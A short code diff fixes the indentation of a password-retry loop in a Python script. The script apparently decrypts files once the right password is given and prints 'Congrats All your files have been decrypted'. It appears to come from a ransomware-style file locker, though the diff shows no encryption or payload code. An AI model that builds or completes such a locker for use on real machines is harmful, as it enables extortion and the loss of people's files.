@@ -45,9 +45,10 @@ def passw(passg,inc_cnt1):
         dec()
         print("Congrats All your files have been decrypted")
     else:
-    inc_cnt1 += 1
-    print("Wrong attempt number:"+str(inc_cnt1)+". Enter Correct password:\n")
-    helm = input()
-    passw(helm,inc_cnt1)
-       
+        inc_cnt1 += 1
+        print("Wrong attempt number:"+str(inc_cnt1)+". Enter Correct password:\n")
+        helm = input()
+        passw(helm,inc_cnt1)
+
+
 passw(password,inc_cnt)
